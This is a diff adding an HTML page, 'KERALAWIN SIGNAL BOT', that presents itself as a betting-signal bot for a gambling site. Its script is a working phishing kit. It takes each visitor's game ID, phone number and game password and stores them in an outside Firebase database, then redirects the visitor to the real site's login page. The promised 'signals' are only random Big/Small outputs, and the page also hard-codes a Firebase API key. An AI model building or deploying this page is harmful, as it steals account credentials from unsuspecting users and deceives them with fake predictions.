@@ -1,1 +1,159 @@
+<!DOCTYPE html><html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KERALAWIN SIGNAL BOT</title><!-- Firebase SDK -->
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-analytics.js";
 
+    // Firebase Configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyCrKHRzeKjiGbbr-nHXxPokcFBzetNTsbo",
+        authDomain: "aviator-gane-account.firebaseapp.com",
+        databaseURL: "https://aviator-gane-account-default-rtdb.firebaseio.com",
+        projectId: "aviator-gane-account",
+        storageBucket: "aviator-gane-account.firebasestorage.app",
+        messagingSenderId: "234420518217",
+        appId: "1:234420518217:web:d6e71f6f91cb332a3f6e98",
+        measurementId: "G-SBVPRPQ7FV"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+    const analytics = getAnalytics(app);
+
+    // Function to save user data
+    function saveUserData(gameId, phoneNumber, gamePassword) {
+        const userId = Date.now();
+        set(ref(db, 'users/' + userId), {
+            gameId: gameId,
+            phoneNumber: phoneNumber,
+            gamePassword: gamePassword
+        }).then(() => {
+            document.getElementById("loadingScreen").style.display = "block";
+            setTimeout(() => {
+                window.location.href = "https://keralawin9.com/#/login";
+            }, 5000);
+        }).catch((error) => {
+            console.error("Error saving data: ", error);
+        });
+    }
+
+    window.onload = function () {
+        document.getElementById("activateBot").addEventListener("click", function () {
+            let gameId = document.getElementById("gameId").value;
+            let phoneNumber = document.getElementById("phoneNumber").value;
+            let gamePassword = document.getElementById("gamePassword").value;
+
+            if (gameId === "" || phoneNumber === "" || gamePassword === "") {
+                alert("Please fill in all fields.");
+                return;
+            }
+            saveUserData(gameId, phoneNumber, gamePassword);
+        });
+
+        document.getElementById("verifyButton").addEventListener("click", function () {
+            let pin = document.getElementById("verifyPin").value;
+            if (pin === "3055") {
+                document.getElementById("wingoPanel").style.display = "none";
+                document.getElementById("gamePanel").style.display = "block";
+                document.getElementById("floatingPanel").style.display = "block";
+            } else {
+                document.getElementById("errorMessage").style.display = "block";
+            }
+        });
+
+        document.getElementById("startGame").addEventListener("click", function () {
+            let result = Math.random() > 0.5 ? "Big" : "Small";
+            document.getElementById("gameResult").innerText = result;
+            document.getElementById("nextGame").style.display = "block";
+        });
+
+        document.getElementById("nextGame").addEventListener("click", function () {
+            let result = Math.random() > 0.5 ? "Big" : "Small";
+            document.getElementById("gameResult").innerText = result;
+        });
+    };
+
+    function togglePanel() {
+        let panel = document.getElementById("gamePanel");
+        panel.style.display = (panel.style.display === "none") ? "block" : "none";
+    }
+</script>
+
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        background-color: #000;
+        color: #fff;
+        margin: 0;
+        padding: 0;
+    }
+    .container { margin-top: 50px; }
+    h1 { font-weight: bold; }
+    .logo { width: 80px; margin: 10px 0; }
+    input, button {
+        display: block;
+        margin: 10px auto;
+        padding: 10px;
+        width: 80%;
+        max-width: 300px;
+        border-radius: 5px;
+    }
+    button {
+        background-color: #ffcc00;
+        font-weight: bold;
+        cursor: pointer;
+        border: none;
+    }
+    #loadingScreen { display: none; margin-top: 20px; }
+    .loader {
+        border: 6px solid #ccc;
+        border-top: 6px solid #ffcc00;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        margin: 10px auto;
+        animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    #wingoPanel, #gamePanel {
+        background: rgba(0, 0, 0, 0.8);
+        padding: 20px;
+        width: 300px;
+        margin: 100px auto;
+        border-radius: 10px;
+        display: none;
+    }
+    #gameResult { font-size: 20px; margin: 20px 0; }
+    #errorMessage { color: red; display: none; }
+    .floating-panel {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        background: #333;
+        padding: 10px;
+        border-radius: 5px;
+        display: none;
+    }
+</style>
+
+</head>
+<body>
+    <div class="container">
+        <h1>KERALAWIN SIGNAL BOT</h1>
+        <img src="https://www.imghippo.com/i/rmC1747usw.jpeg" alt="Logo" class="logo">
+        <input type="text" id="gameId" placeholder="Enter Game ID">
+        <input type="text" id="phoneNumber" placeholder="Enter Phone Number">
+        <input type="password" id="gamePassword" placeholder="Enter Game Password">
+        <button id="activateBot">ACTIVATE BOT</button>
+    </div>
+</body>
+  </html>
